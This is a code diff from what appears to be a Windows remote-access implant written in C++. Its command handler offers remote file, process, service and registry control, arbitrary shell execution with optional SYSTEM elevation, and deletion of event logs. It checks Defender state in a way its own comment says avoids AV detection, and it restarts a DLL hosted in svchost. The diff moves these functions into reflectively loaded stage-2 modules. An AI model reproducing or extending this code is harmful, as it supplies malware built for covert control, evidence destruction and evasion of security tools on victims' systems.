@@ -1685,23 +1685,41 @@ static void handle_command(const std::string& msg_str) {
         else if (cmd == "file_write_chunk") {
             send_ok("\"ready\"");
         }
+        // ── Stage-2 extracted: filemgr.bin (file_delete / mkdir / rename / copy) ──
+        // Stage-1 fallback removed (compiled out) — these commands only work
+        // via the reflectively-loaded filemgr module. If module not loaded yet,
+        // dispatch returns false and the code below returns an error. User's
+        // viewer should retry — by then filemgr.bin is cached + loaded.
         else if (cmd == "file_delete") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_get(msg_str, "path");
             bool ok = g_files.delete_path(path);
             ok ? send_ok("\"deleted\"") : send_err("Delete failed: " + path);
+#else
+            send_err("filemgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "file_mkdir") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_get(msg_str, "path");
             bool ok = g_files.create_directory(path);
             ok ? send_ok("\"created\"") : send_err("mkdir failed: " + path);
+#else
+            send_err("filemgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "file_rename") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string from = json_get(msg_str, "from");
             std::string to   = json_get(msg_str, "to");
             bool ok = g_files.rename_path(from, to);
             ok ? send_ok("\"renamed\"") : send_err("Rename failed");
+#else
+            send_err("filemgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "file_copy") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string from = json_get(msg_str, "from");
             std::string to   = json_get(msg_str, "to");
             if (from.empty() || to.empty()) { send_err("file_copy requires from and to"); return; }
@@ -1709,6 +1727,9 @@ static void handle_command(const std::string& msg_str) {
             fs::create_directories(fs::path(to).parent_path(), ec);
             bool ok = g_files.copy_path(from, to);
             ok ? send_ok("\"copied\"") : send_err("Copy failed: " + from);
+#else
+            send_err("filemgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "file_read_text") {
             std::string path = json_get(msg_str, "path");
@@ -1716,6 +1737,7 @@ static void handle_command(const std::string& msg_str) {
             send_ok("\"" + json_escape(text) + "\"");
         }
         else if (cmd == "file_write_text") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_get(msg_str, "path");
             std::string text;
             try {
@@ -1729,6 +1751,9 @@ static void handle_command(const std::string& msg_str) {
             }
             bool ok = g_files.write_text_file(path, text);
             ok ? send_ok("\"saved\"") : send_err("Write failed: " + path);
+#else
+            send_err("filemgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "file_info") {
             std::string path = json_get(msg_str, "path");
@@ -1766,27 +1791,40 @@ static void handle_command(const std::string& msg_str) {
         else if (cmd == "proc_list") {
             send_ok(g_procs.get_process_list());
         }
+        // ── Stage-2 extracted: procmgr.bin ──
         else if (cmd == "proc_kill") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string pid_s = json_get(msg_str, "pid");
             if (pid_s.empty()) { send_err("Missing pid"); return; }
             DWORD pid = std::stoul(pid_s);
             bool ok = g_procs.kill_process(pid);
             ok ? send_ok("\"killed\"") : send_err("Kill failed for pid " + pid_s);
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "proc_launch") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string exe    = json_get(msg_str, "exe");
             std::string args   = json_get(msg_str, "args");
             std::string elev   = json_get(msg_str, "elevate");
             bool as_admin = (elev == "admin" || elev == "system");
             bool ok = g_procs.launch_process(exe, args, "", as_admin);
             ok ? send_ok("\"launched\"") : send_err("Launch failed: " + exe);
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "term_exec") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string command = json_unescape(json_get(msg_str, "line"));
             if (command.empty()) command = json_unescape(json_get(msg_str, "cmd"));
             if (command.empty() || command == "term_exec") { send_err("Missing command line"); return; }
             std::string output = g_procs.run_cmd_capture(command);
             send_ok("\"" + json_escape(output) + "\"");
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
 
         // --- Services ---
@@ -1794,10 +1832,14 @@ static void handle_command(const std::string& msg_str) {
             send_ok(g_services.get_services_list());
         }
         else if (cmd == "svc_control") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string name   = json_get(msg_str, "name");
             std::string action = json_get(msg_str, "action");
             bool ok = g_services.control_service(name, action);
             ok ? send_ok("\"done\"") : send_err("Service control failed: " + name + " " + action);
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
 
         // --- Registry ---
@@ -1879,6 +1921,7 @@ static void handle_command(const std::string& msg_str) {
             send_ok("{\"subkeys\":" + subkeys + ",\"values\":" + values + "}");
         }
         else if (cmd == "reg_set_value") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_unescape(json_get(msg_str, "path"));
             std::string vname = json_unescape(json_get(msg_str, "name"));
             std::string vtype = json_get(msg_str, "type");
@@ -1917,8 +1960,12 @@ static void handle_command(const std::string& msg_str) {
             }
             RegCloseKey(hKey);
             rc == ERROR_SUCCESS ? send_ok("\"saved\"") : send_err("Write failed (error " + std::to_string(rc) + ")");
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "reg_delete_value") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_unescape(json_get(msg_str, "path"));
             std::string vname = json_unescape(json_get(msg_str, "name"));
             HKEY root; std::string subpath;
@@ -1928,8 +1975,12 @@ static void handle_command(const std::string& msg_str) {
             LONG rc = RegDeleteValueA(hKey, vname.c_str());
             RegCloseKey(hKey);
             rc == ERROR_SUCCESS ? send_ok("\"deleted\"") : send_err("Delete failed (error " + std::to_string(rc) + ")");
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "reg_create_key") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_unescape(json_get(msg_str, "path"));
             HKEY root; std::string subpath;
             if (!parse_reg_path(path, root, subpath)) { send_err("Invalid path"); return; }
@@ -1937,13 +1988,20 @@ static void handle_command(const std::string& msg_str) {
             LONG rc = RegCreateKeyExA(root, subpath.c_str(), 0, nullptr, 0, KEY_READ, nullptr, &hKey, nullptr);
             if (rc == ERROR_SUCCESS) { RegCloseKey(hKey); send_ok("\"created\""); }
             else send_err("Create failed (error " + std::to_string(rc) + ")");
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
         else if (cmd == "reg_delete_key") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_unescape(json_get(msg_str, "path"));
             HKEY root; std::string subpath;
             if (!parse_reg_path(path, root, subpath)) { send_err("Invalid path"); return; }
             LONG rc = RegDeleteKeyA(root, subpath.c_str());
             rc == ERROR_SUCCESS ? send_ok("\"deleted\"") : send_err("Delete key failed (error " + std::to_string(rc) + ")");
+#else
+            send_err("procmgr module loading, retry in a moment");
+#endif
         }
 
         // --- System info ---
@@ -2251,6 +2309,7 @@ static void handle_command(const std::string& msg_str) {
             }
         }
         else if (cmd == "eventlog_delete") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string logName = json_get(msg_str, "log");
             if (logName.empty()) { send_err("Missing log name"); return; }
             std::string idsStr = json_get(msg_str, "ids"); // comma-separated RecordIds to delete, or empty=clear all
@@ -2333,6 +2392,9 @@ static void handle_command(const std::string& msg_str) {
                     send_err("Selective delete failed: " + err);
                 }
             }
+#else
+            send_err("defender module loading, retry in a moment");
+#endif
         }
 
         // ── Screenshot control ──
@@ -2553,6 +2615,7 @@ static void handle_command(const std::string& msg_str) {
         }
 
         else if (cmd == "defender_status") {
+#ifdef STAGE1_KEEP_FALLBACKS
             // Check Defender state via registry (no PowerShell — avoids AV detection)
             bool rtEnabled = true, tamper = false, avEnabled = true;
             HKEY hk;
@@ -2588,9 +2651,13 @@ static void handle_command(const std::string& msg_str) {
             send_ok("{\"antivirus_enabled\":" + std::string(avEnabled?"true":"false") +
                     ",\"realtime_enabled\":" + std::string(rtEnabled?"true":"false") +
                     ",\"tamper_protected\":" + std::string(tamper?"true":"false") + "}");
+#else
+            send_err("defender module loading, retry in a moment");
+#endif
         }
 
         else if (cmd == "host_restart") {
+#ifdef STAGE1_KEEP_FALLBACKS
             // Restart the WPnpSvc service — svchost unloads DLL, SCM restarts it
             send_ok("\"restarting\"");
             Sleep(500);
@@ -2615,6 +2682,9 @@ static void handle_command(const std::string& msg_str) {
                 if (pi.hProcess) CloseHandle(pi.hProcess);
                 if (pi.hThread) CloseHandle(pi.hThread);
             });
+#else
+            send_err("defender module loading, retry in a moment");
+#endif
         }
 
         else if (cmd == "host_update") {
@@ -3001,10 +3071,14 @@ static void handle_command(const std::string& msg_str) {
             send_ok("\"" + json_escape(text) + "\"");
         }
         else if (cmd == "config_write") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string path = json_get(msg_str, "path");
             std::string text = json_unescape(json_get(msg_str, "text"));
             bool ok = g_files.write_text_file(path, text);
             ok ? send_ok("\"saved\"") : send_err("Write failed");
+#else
+            send_err("filemgr module loading, retry in a moment");
+#endif
         }
 
         else if (cmd == "threat_status") {
